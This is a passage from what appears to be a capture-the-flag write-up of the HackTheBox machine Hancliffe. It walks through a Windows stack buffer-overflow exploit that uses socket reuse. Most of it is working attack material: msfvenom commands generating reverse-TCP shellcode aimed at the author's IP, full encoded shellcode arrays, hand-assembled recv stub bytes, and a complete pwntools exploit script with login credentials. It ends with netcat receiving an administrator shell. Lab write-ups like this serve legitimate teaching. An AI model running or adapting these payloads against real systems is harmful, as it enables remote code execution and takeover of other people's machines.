On running this, it breaks at the top of that buffer:

![image-20220203220612192](https://0xdfimages.gitlab.io/img/image-20220203220612192.png)

#### Still Need More Space

The goal here is to jump to some Windows shellcode that will create TCP connection back to me, and provide a shell. Unfortunately, while 66 bytes is a lot more than 10, it’s still not near enough to do that. For example, `msfvenom` will create this shellcode at 351 bytes:

```

oxdf@hacky$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.6 LPORT=443 -b "\x00" -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1712 bytes
buf =  b""
buf += b"\xda\xce\xd9\x74\x24\xf4\x5b\xbf\xbe\xd9\x55\xca\x29"
buf += b"\xc9\xb1\x52\x31\x7b\x17\x03\x7b\x17\x83\x7d\xdd\xb7"
buf += b"\x3f\x7d\x36\xb5\xc0\x7d\xc7\xda\x49\x98\xf6\xda\x2e"
buf += b"\xe9\xa9\xea\x25\xbf\x45\x80\x68\x2b\xdd\xe4\xa4\x5c"
buf += b"\x56\x42\x93\x53\x67\xff\xe7\xf2\xeb\x02\x34\xd4\xd2"
buf += b"\xcc\x49\x15\x12\x30\xa3\x47\xcb\x3e\x16\x77\x78\x0a"
buf += b"\xab\xfc\x32\x9a\xab\xe1\x83\x9d\x9a\xb4\x98\xc7\x3c"
buf += b"\x37\x4c\x7c\x75\x2f\x91\xb9\xcf\xc4\x61\x35\xce\x0c"
buf += b"\xb8\xb6\x7d\x71\x74\x45\x7f\xb6\xb3\xb6\x0a\xce\xc7"
buf += b"\x4b\x0d\x15\xb5\x97\x98\x8d\x1d\x53\x3a\x69\x9f\xb0"
buf += b"\xdd\xfa\x93\x7d\xa9\xa4\xb7\x80\x7e\xdf\xcc\x09\x81"
buf += b"\x0f\x45\x49\xa6\x8b\x0d\x09\xc7\x8a\xeb\xfc\xf8\xcc"
buf += b"\x53\xa0\x5c\x87\x7e\xb5\xec\xca\x16\x7a\xdd\xf4\xe6"
buf += b"\x14\x56\x87\xd4\xbb\xcc\x0f\x55\x33\xcb\xc8\x9a\x6e"
buf += b"\xab\x46\x65\x91\xcc\x4f\xa2\xc5\x9c\xe7\x03\x66\x77"
buf += b"\xf7\xac\xb3\xd8\xa7\x02\x6c\x99\x17\xe3\xdc\x71\x7d"
buf += b"\xec\x03\x61\x7e\x26\x2c\x08\x85\xa1\x59\xc7\x8b\x37"
buf += b"\x36\xd5\x93\x36\x7d\x50\x75\x52\x91\x35\x2e\xcb\x08"
buf += b"\x1c\xa4\x6a\xd4\x8a\xc1\xad\x5e\x39\x36\x63\x97\x34"
buf += b"\x24\x14\x57\x03\x16\xb3\x68\xb9\x3e\x5f\xfa\x26\xbe"
buf += b"\x16\xe7\xf0\xe9\x7f\xd9\x08\x7f\x92\x40\xa3\x9d\x6f"
buf += b"\x14\x8c\x25\xb4\xe5\x13\xa4\x39\x51\x30\xb6\x87\x5a"
buf += b"\x7c\xe2\x57\x0d\x2a\x5c\x1e\xe7\x9c\x36\xc8\x54\x77"
buf += b"\xde\x8d\x96\x48\x98\x91\xf2\x3e\x44\x23\xab\x06\x7b"
buf += b"\x8c\x3b\x8f\x04\xf0\xdb\x70\xdf\xb0\xec\x3a\x7d\x90"
buf += b"\x64\xe3\x14\xa0\xe8\x14\xc3\xe7\x14\x97\xe1\x97\xe2"
buf += b"\x87\x80\x92\xaf\x0f\x79\xef\xa0\xe5\x7d\x5c\xc0\x2f"

```

It can be done with less, but 66 seems impossible.

#### Socket Reuse - Fetch Descriptor

Rastating has a good writeup on [Socket Reuse](https://rastating.github.io/using-socket-reuse-to-exploit-vulnserver/), which I’ll basically follow here.

The program already has an open socket with my host, the one that came from the `accept` call and is being used to run the banking program. If I can get the socket descriptor, I can make a call to socket to read more data from it into a buffer of my choosing.

In x32dbg, I’ll put a break point at the `recv` call that gets the code just before the call to `_SaveCreds`:

```

      recv(sock,recv_buf,0x400,0);
      _memset(code,0,0x50);
      _strncpy(code,recv_buf,0x50);
      _SaveCreds(code,fullname);

```

That address is 0x71901d79:

![image-20220204064559504](https://0xdfimages.gitlab.io/img/image-20220204064559504.png)

`recv` has the following [description](https://docs.microsoft.com/en-us/windows/win32/api/winsock/nf-winsock-recv):

```

int recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);

```

x32dbg shows the arguments as:

![image-20220204152150240](https://0xdfimages.gitlab.io/img/image-20220204152150240.png)

Because this is 32-bit, the arguments are on the stack. I’ll want to make this same call, and need to setup the necessary stack to make it happen, pushing the arguments onto the stack in reverse order.

Before I start messing with the stack, I need to grab the socket descriptor from somewhere. Running the program forward into the call to `_SaveCred`, through the return overwrite and the two jumps, it reaches the buffer of INT instructions where I will have shellcode. At this point, EBP has been stomped by the overflow, but the ESP register still has an address on the stack. And more importantly, down the stack a bit, the socket descriptor is still present:

![](https://0xdfimages.gitlab.io/img/hancliffe-socket-stack.png)

This means I can get the value by loading esp, adding 0x48, and then getting the value from that address:

```

push esp
pop eax
add ax, 0x48
push dword [eax]

```

Unfortunately, `add az, 0x48` has nulls in it:

```

metasm > add ax, 0x48
"\x66\x05\x48\x00"

```

I’ll add 0x149 and then subtract 0x101:

```

metasm > add ax, 0x149
"\x66\x05\x49\x01"
metasm > sub ax, 0x101
"\x66\x2d\x01\x01"

```

The updated payload is now:

```

recv_sc = (
        # get socket descriptor in esi
        b"\x54"               # push esp
        b"\x58"               # pop eax
        b"\x66\x05\x49\x01"   # add ax, 0x149
        b"\x66\x2d\x01\x01"   # sub ax, 0x101
        b"\x8b\x30"           # mov esi, dword [eax]
        )

payload = recv_sc + b"\xCC"*(66-len(recv_sc)) + p32(0x7190239f) + b"\xeb\xb8"

```

On running this, with a break at the `recv`, I can see the socket descriptor, in this case, as 0x114. Continuing to the shellcode, ESI now has that value:

![image-20220204153652747](https://0xdfimages.gitlab.io/img/image-20220204153652747.png)

#### Separate EIP and ESP

From here, I’m going to prep the stack to call `recv`, but first, there’s an issue I need to take care of. Right now, the stack looks like this:

[![](https://0xdfimages.gitlab.io/img/hancliffe-stack-need-space.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/hancliffe-stack-need-space.png)

The next thing I’m going to do is `call recv`, which will start by creating a new stack frame, pushing ESP up in the diagram towards EIP, and telling `recv` it can write in this space. I don’t want EIP to run into ESP this way, so I’ll just subtract a value from ESP to move it up above EIP

Next I’m going to make some more space on the stack. Currently, EIP is 0x43 bytes less than (above) ESP, so I’ll just subtract an even 0x64 to clear the space:

```

metasm > sub esp, 0x64
"\x83\xec\x64"

```

#### Socket Reuse - Call recv

Now it’s time to put arguments on the stack. First, push a null for the flags:

```

xor ebx, ebx
push ebx

```

Next comes the read size. I want to avoid null bytes, so I’ll push something that’s not round (0x404 instead of 0x400):

```

add bx, 404
push ebx

```

It’s important to add to bx and not ebx, or else the command will expand 0x404 with some leading null bytes.

Now I need space to output. The article suggests either writing to some address on the stack and then jumping to it, or just calculating the address just after the `recv` call and writing it in place. I can just put ESP minux 0x64 (the amount I spaced in above) in here now, and run it and check how far from the actual goal it is, and then adjust if necessary.

I need to call `WS2_32.DLL::recv`. That address will move around in memory depending on where the DLL is loaded in memory. The legit program stores the address in a global, loads that into eax, and calls it:

![image-20220204141100479](https://0xdfimages.gitlab.io/img/image-20220204141100479.png)

The global is at 0x719082ac:

![image-20220204141314037](https://0xdfimages.gitlab.io/img/image-20220204141314037.png)

```

metasm > mov eax, [0x719082ac]
"\xa1\xac\x82\x90\x71"
metasm > call eax
"\xff\xd0"

```

The payload is now:

```

recv_sc = (
        # get socket descriptor in esi
        b"\x54"                   # push esp
        b"\x58"                   # pop eax
        b"\x66\x05\x49\x01"       # add ax, 0x149
        b"\x66\x2d\x01\x01"       # sub ax, 0x101
        b"\x8b\x30"               # mov esi, dword [eax]

        # make space on stack
        b"\x83\xec\x64"           # sub esp, 0x64

        # push recv args
        b"\x31\xdb"               # xor ebx, ebx
        b"\x53"                   # push ebx, recv flags = 0
        b"\x66\x81\xc3\x04\x04"   # add bx, 0x404
        b"\x53"                   # push ebx, size = 0x404
        b"\x54"                   # push esp
        b"\x5b"                   # pop ebx
        b"\x83\xc3\x64"           # add ebx, 0x64
        b"\x53"                   # push ebx, buffer
        b"\x56"                   # push esi, sock descriptor

        # call recv
        b"\xa1\xac\x82\x90\x71"   # mov eax, [0x719082ac]
        b"\xff\xd0"               # call eax 
        )

payload = recv_sc + b"\xCC"*(66-len(recv_sc)) + p32(0x7190239f) + b"\xeb\xb8"

```

I’ll break at the `jmp esp`, and then step through to see where it would be called, and it looks good:

[![](https://0xdfimages.gitlab.io/img/hancliffe-socket-stack-2.png)*Click for full size image*](https://0xdfimages.gitlab.io/img/hancliffe-socket-stack-2.png)

It’s about to call EAX, which holds `recv`, and store the shellcode after a handful of bytes that I control. It will then return to the next instruction, which at the moment they are INTs (`\xCC`). I’ll change them to NOPs (`\x90`) so that execution continues without issue through the NOPs and to the shellcode.

#### Add Shellcode

Given that this all looks good, I’ll add the shellcode from `msfvenom` generated using the following:

```

msfvenom -p windows/shell_reverse_tcp LHOST=10.1.1.164 LPORT=443 -b "\x00" -f python

```

I wasn’t able to get it to work running in x32dbg, but with the binary running naturally, it worked:

```

oxdf@hacky$ python3 sploit.py PORT=9920
[+] Opening connection to 10.1.1.163 on port 9920: Done
[*] Closed connection to 10.1.1.163 port 9920

```

At `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.1.1.163 49996
Microsoft Windows [Version 10.0.19044.1288]
(c) Microsoft Corporation. All rights reserved.

FLARE Fri 02/04/2022 18:59:01.48
Z:\hackthebox\hancliffe-10.10.11.115>

```

### Remote Exploit

I’ll update the connecting in the script to take both the IP and PORT as args. I’ll also replace the shellcode with my tun0 IP.

The final script is:

```

#!/usr/bin/env python3

from pwn import *

r = remote(args['IP'], args['PORT'])

# 10.10.14.6:443
shellcode =  b""
shellcode += b"\xb8\xcb\x04\x2d\xcb\xda\xd4\xd9\x74\x24\xf4"
shellcode += b"\x5b\x33\xc9\xb1\x52\x31\x43\x12\x03\x43\x12"
shellcode += b"\x83\x20\xf8\xcf\x3e\x4a\xe9\x92\xc1\xb2\xea"
shellcode += b"\xf2\x48\x57\xdb\x32\x2e\x1c\x4c\x83\x24\x70"
shellcode += b"\x61\x68\x68\x60\xf2\x1c\xa5\x87\xb3\xab\x93"
shellcode += b"\xa6\x44\x87\xe0\xa9\xc6\xda\x34\x09\xf6\x14"
shellcode += b"\x49\x48\x3f\x48\xa0\x18\xe8\x06\x17\x8c\x9d"
shellcode += b"\x53\xa4\x27\xed\x72\xac\xd4\xa6\x75\x9d\x4b"
shellcode += b"\xbc\x2f\x3d\x6a\x11\x44\x74\x74\x76\x61\xce"
shellcode += b"\x0f\x4c\x1d\xd1\xd9\x9c\xde\x7e\x24\x11\x2d"
shellcode += b"\x7e\x61\x96\xce\xf5\x9b\xe4\x73\x0e\x58\x96"
shellcode += b"\xaf\x9b\x7a\x30\x3b\x3b\xa6\xc0\xe8\xda\x2d"
shellcode += b"\xce\x45\xa8\x69\xd3\x58\x7d\x02\xef\xd1\x80"
shellcode += b"\xc4\x79\xa1\xa6\xc0\x22\x71\xc6\x51\x8f\xd4"
shellcode += b"\xf7\x81\x70\x88\x5d\xca\x9d\xdd\xef\x91\xc9"
shellcode += b"\x12\xc2\x29\x0a\x3d\x55\x5a\x38\xe2\xcd\xf4"
shellcode += b"\x70\x6b\xc8\x03\x76\x46\xac\x9b\x89\x69\xcd"
shellcode += b"\xb2\x4d\x3d\x9d\xac\x64\x3e\x76\x2c\x88\xeb"
shellcode += b"\xd9\x7c\x26\x44\x9a\x2c\x86\x34\x72\x26\x09"
shellcode += b"\x6a\x62\x49\xc3\x03\x09\xb0\x84\x21\xc4\xb4"
shellcode += b"\x52\x5e\xda\xc8\x5b\x25\x53\x2e\x31\x49\x32"
shellcode += b"\xf9\xae\xf0\x1f\x71\x4e\xfc\xb5\xfc\x50\x76"
shellcode += b"\x3a\x01\x1e\x7f\x37\x11\xf7\x8f\x02\x4b\x5e"
shellcode += b"\x8f\xb8\xe3\x3c\x02\x27\xf3\x4b\x3f\xf0\xa4"
shellcode += b"\x1c\xf1\x09\x20\xb1\xa8\xa3\x56\x48\x2c\x8b"
shellcode += b"\xd2\x97\x8d\x12\xdb\x5a\xa9\x30\xcb\xa2\x32"
shellcode += b"\x7d\xbf\x7a\x65\x2b\x69\x3d\xdf\x9d\xc3\x97"
shellcode += b"\x8c\x77\x83\x6e\xff\x47\xd5\x6e\x2a\x3e\x39"
shellcode += b"\xde\x83\x07\x46\xef\x43\x80\x3f\x0d\xf4\x6f"
shellcode += b"\xea\x95\x04\x3a\xb6\xbc\x8c\xe3\x23\xfd\xd0"
shellcode += b"\x13\x9e\xc2\xec\x97\x2a\xbb\x0a\x87\x5f\xbe"
shellcode += b"\x57\x0f\x8c\xb2\xc8\xfa\xb2\x61\xe8\x2e"

recv_sc = (
        # get socket descriptor in esi
        b"\x54"                       # push esp
        b"\x58"                       # pop eax
        b"\x66\x05\x49\x01"           # add ax, 0x149
        b"\x66\x2d\x01\x01"           # sub ax, 0x101
        b"\x8b\x30"                   # mov esi, dword [eax]

        # make space on stack
        b"\x83\xec\x64"               # sub esp, 0x64

        # push recv args
        b"\x31\xdb"                   # xor ebx, ebx
        b"\x53"                       # push ebx, recv flags = 0
        b"\x66\x81\xc3\x04\x04"       # add bx, 0x404
        b"\x53"                       # push ebx, size = 0x404
        b"\x54"                       # push esp
        b"\x5b"                       # pop ebx
        b"\x83\xc3\x64"               # add ebx, 0x64
        b"\x53"                       # push ebx, buffer
        b"\x56"                       # push esi, sock descriptor

        # call recv
        b"\x3e\xa1\xac\x82\x90\x71"   # mov eax, [0x719082ac]
        b"\xff\xd0"                   # call eax 
        )

payload = recv_sc + b"\x90"*(66-len(recv_sc)) + p32(0x7190239f) + b"\xeb\xb8"

r.recvuntil(b"Username: ")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password: ")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName: ")
r.sendline(b"0xdf")
r.recvuntil(b"Input Your Code: ")
r.sendline(payload)
time.sleep(1)
r.send(shellcode)

```

Now I’ll fire it at Hancliffe:

```

oxdf@hacky$ python3 sploit.py IP=10.10.11.115 PORT=9999
[+] Opening connection to 10.10.11.115 on port 9999: Done
[*] Closed connection to 10.10.11.115 port 9999

```

At `nc`:

```

oxdf@hacky$ nc -lnvp 443
Listening on 0.0.0.0 443
Connection received on 10.10.11.115 58565
Microsoft Windows [Version 10.0.19043.1266]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
hancliffe\administrator

```

And I can grab `root.txt`:

```

C:\Users\Administrator\Desktop>type root.txt
3a0478e0************************

```